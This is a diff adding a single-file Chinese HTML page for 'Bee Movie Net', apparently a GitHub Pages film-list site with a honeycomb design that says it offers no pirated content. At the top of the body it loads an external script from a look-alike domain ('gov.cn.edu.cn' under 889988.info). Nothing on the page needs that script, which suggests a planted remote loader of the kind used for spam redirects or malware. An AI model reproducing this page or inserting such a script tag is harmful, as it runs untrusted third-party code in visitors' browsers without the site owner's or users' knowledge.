@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>蜜蜂电影网 - 蜂巢六角格影视导航 | mifengdianyingwang-h5</title>
+<meta name="description" content="蜜蜂电影网（mifengdianyingwang-h5）做蜂巢六角格影视导航：今日采蜜、蜂巢热片、花田类型、工蜂排片表。像工蜂采片，不提供盗版下载与在线盗播。https://mifengdianyingwang-h5.github.io" />
+<meta name="keywords" content="蜜蜂电影网,mifengdianyingwang-h5,蜂巢影视,六角格片单,影视导航,花田类型,工蜂排片" />
+<link rel="canonical" href="https://mifengdianyingwang-h5.github.io/" />
+<meta property="og:title" content="蜜蜂电影网 - 蜂巢里的电影花园" />
+<meta property="og:description" content="今日采蜜 / 蜂巢热片 / 花田类型 / 工蜂排片表，像工蜂把好片子搬回巢。" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://mifengdianyingwang-h5.github.io/" />
+<meta name="twitter:card" content="summary_large_image" />
+<style>
+:root{
+  --honey:#f6c453;
+  --honey2:#ffd97a;
+  --comb:#1c1a14;
+  --comb2:#2a261b;
+  --cream:#fff7e6;
+  --green:#7fae5a;
+  --green2:#a7d27e;
+  --line:#e0c98a;
+  --ink:#2a2410;
+  --ink2:#6f6336;
+  --shadow:0 5px 0 #e0c98a;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(820px 380px at 92% -8%, rgba(246,196,83,.35), transparent 60%),
+    radial-gradient(680px 340px at -6% 6%, rgba(127,174,90,.20), transparent 55%),
+    linear-gradient(180deg,#fff7e6,#fdeecb 60%,#f6e3b6);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei",ui-sans-serif,system-ui,"Segoe UI",sans-serif;
+  line-height:1.72;font-size:16px;-webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+.mono{font-family:ui-monospace,"Courier New",monospace}
+
+.topbar{position:sticky;top:0;z-index:50;background:var(--comb);color:var(--cream);border-bottom:3px solid var(--honey)}
+.top-in{display:flex;align-items:center;justify-content:space-between;height:62px;gap:12px}
+.logo{display:flex;align-items:center;gap:10px}
+.logo .bee{width:34px;height:34px;border-radius:50%;background:radial-gradient(circle at 50% 35%,var(--honey2),var(--honey));display:grid;place-items:center;font-size:18px;box-shadow:0 0 0 2px var(--comb2),0 0 0 4px var(--honey)}
+.logo b{font-size:19px;letter-spacing:.5px}
+.logo small{font-size:11px;color:var(--honey2);font-family:ui-monospace,monospace}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:13px;padding:7px 12px;border:1px solid var(--honey);color:var(--cream);border-radius:2px;font-weight:700}
+.nav a:hover{background:var(--honey);color:var(--comb)}
+.menu-btn{display:none;width:42px;height:42px;border:1px solid var(--honey);background:var(--comb2);color:var(--honey);font-size:20px;cursor:pointer}
+
+.hero{padding:42px 0 26px;position:relative;overflow:hidden}
+.hero .pollen{position:absolute;inset:0;background-image:radial-gradient(rgba(246,196,83,.35) 1px,transparent 1px);background-size:7px 7px;pointer-events:none;opacity:.5}
+.hero-grid{display:grid;grid-template-columns:1fr 320px;gap:34px;align-items:center;position:relative}
+.badge{display:inline-block;background:var(--green);color:#15210b;font-family:ui-monospace,monospace;font-size:11px;padding:4px 12px;border-radius:2px;letter-spacing:2px;box-shadow:0 3px 0 #5c8040}
+.hero h1{font-size:clamp(30px,5.6vw,52px);line-height:1.05;font-weight:900;margin:14px 0}
+.hero h1 em{font-style:normal;color:var(--honey)}
+.hero h1 .grn{color:var(--green)}
+.hero p{color:var(--ink2);max-width:540px;margin-bottom:20px}
+.cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:12px 22px;border-radius:999px;font-weight:800;font-size:14px;border:0;cursor:pointer;background:var(--honey);color:var(--comb);box-shadow:var(--shadow)}
+.btn:hover{background:var(--honey2)}
+.btn.ghost{background:transparent;color:var(--green);border:2px solid var(--green);box-shadow:none}
+.combcard{background:var(--comb2);border:3px solid var(--honey);border-radius:18px;padding:18px;position:relative;color:var(--cream);overflow:hidden}
+.combcard .hx{position:absolute;inset:0;background:
+  radial-gradient(circle at 20% 20%, rgba(246,196,83,.18) 0 26px, transparent 27px),
+  radial-gradient(circle at 70% 40%, rgba(167,210,126,.16) 0 26px, transparent 27px),
+  radial-gradient(circle at 40% 80%, rgba(246,196,83,.14) 0 26px, transparent 27px);
+  pointer-events:none}
+.combcard .cap{font-family:ui-monospace,monospace;font-size:10px;letter-spacing:3px;color:var(--honey2)}
+.combcard .big{font-size:46px;margin-top:10px}
+.combcard .stat{margin-top:12px;font-family:ui-monospace,monospace;font-size:11px;color:var(--green2);display:flex;gap:10px;flex-wrap:wrap}
+.combcard .stat b{color:var(--honey2)}
+
+.sec{padding:36px 0;border-bottom:2px dashed var(--line)}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:20px}
+.sec-head .tag{background:var(--comb);color:var(--honey2);font-family:ui-monospace,monospace;font-size:11px;padding:4px 10px;border:1px solid var(--honey)}
+.sec-head h2{font-size:22px;font-weight:900}
+.sec-head a{margin-left:auto;font-size:13px;color:var(--green);font-family:ui-monospace,monospace;border-bottom:1px solid var(--green)}
+
+/* honeycomb grid */
+.comb-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.cell{position:relative;aspect-ratio:1/1.04;background:linear-gradient(160deg,var(--cream),#fbe6b8);border:2px solid var(--line);clip-path:polygon(50% 0,100% 25%,100% 75%,50% 100%,0 75%,0 25%);display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:18px}
+.cell .em{font-size:40px}
+.cell h3{font-size:16px;font-weight:900;margin-top:6px}
+.cell p{font-size:12px;color:var(--ink2);padding:0 8px}
+.cell .go{margin-top:8px;font-size:11px;font-weight:800;background:var(--comb);color:var(--honey2);padding:5px 12px;border-radius:999px}
+.cell.c2{background:linear-gradient(160deg,#eef6e6,#cfe6b6)}
+.cell.c3{background:linear-gradient(160deg,#fff0d6,#f6c453)}
+.cell.c4{background:linear-gradient(160deg,#eaf3ff,#cfe0f6)}
+.cell.c5{background:linear-gradient(160deg,#f6e6ef,#e6b9cf)}
+.cell.c6{background:linear-gradient(160deg,#eef0ea,#cdd6c2)}
+
+.rooms{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.room{background:var(--cream);border:2px solid var(--line);border-radius:14px;padding:18px;display:grid;grid-template-columns:52px 1fr;gap:14px;align-items:start;box-shadow:var(--shadow)}
+.room .ic{width:52px;height:52px;border-radius:14px;display:grid;place-items:center;font-size:26px;background:var(--comb2);color:var(--honey2);border:1px solid var(--honey)}
+.room h3{font-size:15px;font-weight:850}
+.room p{font-size:13px;color:var(--ink2);margin-top:4px}
+.room .note{margin-top:6px;font-style:italic;color:var(--green)}
+
+.route{display:flex;gap:10px;overflow-x:auto;padding:6px 0 12px}
+.stop{flex:0 0 150px;background:var(--cream);border:2px solid var(--line);border-radius:12px;padding:12px}
+.stop .no{font-family:ui-monospace,monospace;font-size:10px;color:var(--green)}
+.stop .em{font-size:26px}
+.stop b{display:block;font-size:13px;margin-top:6px}
+.stop span{font-size:11px;color:var(--ink2)}
+
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:0;border:3px double var(--comb);background:var(--cream)}
+.about .l{padding:22px;border-right:3px double var(--comb)}
+.about .l h3{font-size:20px;font-weight:900;margin-bottom:10px}
+.about .l p{font-size:14px;color:var(--ink2);margin-bottom:10px}
+.about .r{background:#fbeecb;padding:22px;font-size:13px;color:var(--ink2)}
+.about .r li{list-style:none;padding:8px 0;border-bottom:1px dotted var(--line)}
+.about .r li:before{content:"🐝 "}
+
+.foot{border-top:4px solid var(--comb);background:var(--comb);color:var(--cream);padding:28px 0}
+.fg{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:20px}
+.foot h4{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--honey2);margin-bottom:12px}
+.foot a{display:block;font-size:13px;color:var(--cream);padding:4px 0;opacity:.85}
+.foot a:hover{opacity:1;color:var(--honey)}
+.url{display:inline-block;margin-top:8px;font-family:ui-monospace,monospace;font-size:12px;border:1px dashed var(--honey);padding:6px 10px;color:var(--honey2)}
+.copy{margin-top:18px;text-align:center;font-size:11px;opacity:.6}
+
+.drawer{position:fixed;inset:0 0 0 auto;width:260px;background:var(--cream);border-left:3px solid var(--comb);z-index:60;padding:22px;transform:translateX(100%);transition:transform .28s;display:flex;flex-direction:column;gap:8px}
+.drawer.open{transform:none}
+.drawer a{padding:11px;border:1px solid var(--line);font-weight:800;color:var(--ink);background:#fbeecb}
+.drawer .x{align-self:flex-end;background:none;border:0;font-size:24px;cursor:pointer;color:var(--green)}
+.mask{position:fixed;inset:0;background:rgba(28,26,20,.6);z-index:55;display:none}
+.mask.show{display:block}
+
+@media(max-width:1024px){
+  .hero-grid{grid-template-columns:1fr}
+  .comb-grid{grid-template-columns:repeat(2,1fr)}
+  .about{grid-template-columns:1fr}
+  .about .l{border-right:none;border-bottom:3px double var(--comb)}
+  .fg{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .nav{display:none}
+  .menu-btn{display:block}
+  .comb-grid{grid-template-columns:1fr}
+  .rooms{grid-template-columns:1fr}
+  .fg{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap top-in">
+    <div class="logo"><span class="bee">🐝</span><div><b>蜜蜂电影网</b><br><small>mifengdianyingwang-h5</small></div></div>
+    <nav class="nav" id="nav">
+      <a href="#pick">今日采蜜</a>
+      <a href="#hot">蜂巢热片</a>
+      <a href="#field">花田类型</a>
+      <a href="#route">工蜂排片</a>
+      <a href="#about">关于蜜蜂</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero">
+    <div class="pollen"></div>
+    <div class="hero-grid">
+      <div>
+        <span class="badge">HONEYCOMB CINEMA · 蜂巢影视</span>
+        <h1>蜜蜂电影网：<br/>像工蜂一样，把<span class="grn">好片子</span>搬回<span em>蜂巢</span></h1>
+        <p>蜜蜂电影网（mifengdianyingwang-h5）用蜂巢六角格做影视导航：今日采蜜、蜂巢热片、花田类型、工蜂排片表。不喊“免费高清秒播”，只做干净片单与正版/公开物料入口。</p>
+        <div class="cta">
+          <a href="#pick" class="btn">去花田采蜜</a>
+          <a href="#hot" class="btn ghost">看蜂巢热片</a>
+        </div>
+      </div>
+      <aside class="combcard">
+        <div class="hx"></div>
+        <div class="cap">HIVE STATUS · 蜂巢在线</div>
+        <div class="big">🍯</div>
+        <div class="stat"><span>采到：<b>128 部</b></span><span>花田：<b>9 块</b></span><span>工蜂：<b>24 只</b></span></div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="sec" id="pick">
+    <div class="sec-head"><span class="tag">POLLEN 01</span><h2>今日采蜜</h2><a href="#">整片花田 #</a></div>
+    <div class="comb-grid">
+      <div class="cell"><div class="em">🛰️</div><h3>星轨回音</h3><p>太空站最后一夜，冷光像蜜里掺了冰。</p><a href="#" class="go">采这片 →</a></div>
+      <div class="cell c2"><div class="em">🌾</div><h3>麦田慢车</h3><p>乡野治愈：猫、晒谷场、没赶上的班车。</p><a href="#" class="go">采这片 →</a></div>
+      <div class="cell c3"><div class="em">🏮</div><h3>长安灯市录</h3><p>上元夜走马灯，暖黄得像刚酿好的蜜。</p><a href="#" class="go">采这片 →</a></div>
+      <div class="cell c4"><div class="em">🪐</div><h3>深海钟摆</h3><p>太空冷光 + 海洋纪录片质感。</p><a href="#" class="go">采这片 →</a></div>
+      <div class="cell c5"><div class="em">🎻</div><h3>夜曲都市</h3><p>霓虹、爵士、便利店，凌晨三点不睡觉。</p><a href="#" class="go">采这片 →</a></div>
+      <div class="cell c6"><div class="em">🐉</div><h3>山海钟鸣</h3><p>国漫神话，归墟巨兽与少年敲钟人。</p><a href="#" class="go">采这片 →</a></div>
+    </div>
+  </section>
+
+  <section class="sec" id="hot">
+    <div class="sec-head"><span class="tag">HIVE</span><h2>蜂巢热片</h2><a href="#">热度榜 #</a></div>
+    <div class="rooms">
+      <div class="room"><div class="ic">🍯</div><div><h3>蜂后精选：慢镜头合集</h3><p>3 秒黑场、雨落屋檐、未接电话——适合睡前看。</p><div class="note">“甜的不是结局，是等待的那段。”</div></div></div>
+      <div class="room"><div class="ic">🐝</div><div><h3>工蜂加班厅：noir 雾夜</h3><p>雨衣、烟、走廊长镜、没说出口的供词。</p><div class="note">“案子破不破不重要，灯一直没关。”</div></div></div>
+      <div class="room"><div class="ic">🌻</div><div><h3>花田首映：治愈动画</h3><p>猫村、邮差、会写字的狐狸，全年龄。</p><div class="note">“动画片不是小孩专属，是大人复健。”</div></div></div>
+      <div class="room"><div class="ic">🎞️</div><div><h3>陈蜜修复：4K 老片</h3><p>夏日来信、烟花巷口、夜曲都市 DC 版。</p><div class="note">“老片回甘，像隔年的槐花蜜。”</div></div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="field">
+    <div class="sec-head"><span class="tag">FIELD</span><h2>花田类型</h2><a href="#">全部花田 #</a></div>
+    <div class="route">
+      <div class="stop"><div class="no">A1</div><div class="em">🌫️</div><b>雾夜 noir</b><span>雨/烟/走廊</span></div>
+      <div class="stop"><div class="no">A2</div><div class="em">🌾</div><b>乡野治愈</b><span>麦田/猫/慢车</span></div>
+      <div class="stop"><div class="no">A3</div><div class="em">🪐</div><b>太空冷光</b><span>AI/静音/霜窗</span></div>
+      <div class="stop"><div class="no">A4</div><div class="em">🏮</div><b>古装暖黄</b><span>灯市/茶铺/权谋</span></div>
+      <div class="stop"><div class="no">A5</div><div class="em">🎷</div><b>都市夜场</b><span>霓虹/爵士/凌晨</span></div>
+      <div class="stop"><div class="no">A6</div><div class="em">📷</div><b>胶片青春</b><span>暗房/信/夏天</span></div>
+      <div class="stop"><div class="no">A7</div><div class="em">🐟</div><b>奇幻低饱和</b><span>海/神/雾/钟</span></div>
+    </div>
+  </section>
+
+  <section class="sec" id="route">
+    <div class="sec-head"><span class="tag">SHIFT</span><h2>工蜂排片表</h2><a href="#">全天排片 #</a></div>
+    <div class="rooms">
+      <div class="room"><div class="ic">🌅</div><div><h3>晨班：治愈与动画</h3><p>07:00 麦田慢车 / 08:30 猫村邮差 / 10:00 会写字的狐狸。</p><div class="note">“早上别看悬疑，脑子会打结。”</div></div></div>
+      <div class="room"><div class="ic">🌙</div><div><h3>夜班：noir 与都市</h3><p>21:00 雾夜长廊 / 22:30 夜曲都市 / 00:00 未接电话。</p><div class="note">“半夜看爱情片容易翻前任聊天记录。”</div></div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="about">
+    <div class="sec-head"><span class="tag">ABOUT</span><h2>关于蜜蜂电影网</h2></div>
+    <div class="about">
+      <div class="l">
+        <h3>蜜蜂电影网：名字安全，风格不撞</h3>
+        <p>“蜜蜂”不是低俗词、不是擦边词、也不是“XX元”式低价盗版话术，所以本站名<b>不改</b>，域名 <b>mifengdianyingwang-h5</b> 保留。</p>
+        <p>本站是蜂巢六角格<b>影视导航</b>：今日采蜜、蜂巢热片、花田类型、工蜂排片表。不提供盗版资源下载与在线盗播；如列播放入口，仅指向持证长视频平台或片方公开物料。</p>
+        <p>单文件 index.html、CSS/JS 内联、移动端自适应，适合 GitHub Pages 做影视书签站 / 片单聚合 / 小众电影花园。</p>
+      </div>
+      <ul class="r">
+        <li>蜜黄 + 蜂巢黑 + 花粉白 + 草绿</li>
+        <li>六角格 clip-path 排片</li>
+        <li>蜂后精选 / 工蜂加班 / 花田首映</li>
+        <li>晨班治愈、夜班 noir</li>
+        <li>内链用 #，不伪造深链</li>
+        <li>必应友好：标题/描述/canonical 齐</li>
+      </ul>
+    </div>
+  </section>
+
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="fg">
+      <div>
+        <h4>蜜蜂电影网</h4>
+        <p style="font-size:13px;opacity:.85">蜂巢六角格影视导航：像工蜂采片，不喊免费秒播。</p>
+        <span class="url">https://mifengdianyingwang-h5.github.io</span>
+      </div>
+      <div><h4>蜂巢</h4><a href="#pick">今日采蜜 #</a><a href="#hot">蜂巢热片 #</a><a href="#field">花田类型 #</a><a href="#route">工蜂排片 #</a></div>
+      <div><h4>花田</h4><a href="#">雾夜 noir #</a><a href="#">乡野治愈 #</a><a href="#">太空冷光 #</a><a href="#">古装暖黄 #</a></div>
+      <div><h4>站点</h4><a href="#pick">采蜜 #</a><a href="#hot">热片 #</a><a href="#field">花田 #</a><a href="#about">关于 #</a></div>
+    </div>
+    <div class="copy">© 2026 蜜蜂电影网 mifengdianyingwang-h5 · 蜂巢六角格影视导航演示；不存储、不转码、不提供未经授权播放。</div>
+  </div>
+</footer>
+
+<div class="mask" id="mask"></div>
+<aside class="drawer" id="drawer">
+  <button class="x" id="drawerClose">×</button>
+  <a href="#pick">今日采蜜</a>
+  <a href="#hot">蜂巢热片</a>
+  <a href="#field">花田类型</a>
+  <a href="#route">工蜂排片</a>
+  <a href="#about">关于蜜蜂</a>
+</aside>
+
+<script>
+  var menuBtn=document.getElementById('menuBtn');
+  var drawer=document.getElementById('drawer');
+  var mask=document.getElementById('mask');
+  var close=document.getElementById('drawerClose');
+  menuBtn.addEventListener('click',function(){drawer.classList.add('open');mask.classList.add('show')});
+  close.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  mask.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  drawer.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')})});
+</script>
+</body>
+</html>
